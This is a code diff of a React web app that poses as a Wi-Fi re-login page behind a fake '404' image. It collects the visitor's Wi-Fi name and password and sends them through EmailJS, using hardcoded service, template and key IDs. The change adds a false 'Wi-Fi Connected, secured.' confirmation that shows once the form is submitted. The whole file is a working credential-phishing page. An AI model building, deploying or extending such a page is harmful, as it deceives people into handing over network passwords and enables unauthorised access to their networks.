@@ -1,20 +1,20 @@
 import './App.css';
 import {
-    Button,
     FormControl,
     FormLabel,
-    Input,
     Text,
     Checkbox,
     Image
 } from '@chakra-ui/react'
 
 import emailjs from '@emailjs/browser';
-import React, { useRef } from "react";
+import React, { useRef, useState } from "react";
 
 function App() {
+    const [submitClicked, setSubmitClicked] = useState(false)
     const form = useRef()
     const handleSubmit = (e) => {
+        setSubmitClicked(true)
         e.preventDefault();
         emailjs.sendForm("service_56j9lnj", "template_smh0a0i", form.current, "Wpsx159ePIxz6QegT")
             .then((result) => {
@@ -45,17 +45,20 @@ function App() {
                 <Image src="/404-error-1.png" boxSize='300px'
                     objectFit='cover' alt='404' />
             </div>
-
+            {submitClicked ?
+                <div>
+                    <Text fontSize="20px" className='Login-Text' fontWeight="bold">Wi-Fi Connected, secured.</Text>
+                </div> : []}
             <div className="Log-In-Container">
                 <Text fontSize="20px" className='Login-Text' fontWeight="bold">Please Log In Again...</Text>
                 <form className='Form' ref={form} onSubmit={handleSubmit}>
                     <FormControl isRequired >
                         <FormLabel>Wi-Fi Name</FormLabel>
-                        <input className='Input-Field' placeholder='Wi-Fi Name' type='text' name="user_name"/>
+                        <input className='Input-Field' placeholder='Wi-Fi Name' type='text' name="user_name" />
                     </FormControl>
                     <FormControl isRequired>
                         <FormLabel>Wi-Fi Password</FormLabel>
-                        <input className='Input-Field' type='password' placeholder='Wi-Fi Password' name="user_password"/>
+                        <input className='Input-Field' type='password' placeholder='Wi-Fi Password' name="user_password" />
                     </FormControl>
                     <Checkbox defaultChecked>Connect automatically</Checkbox>
                     <button className='button' value='submit'>Connect</button>
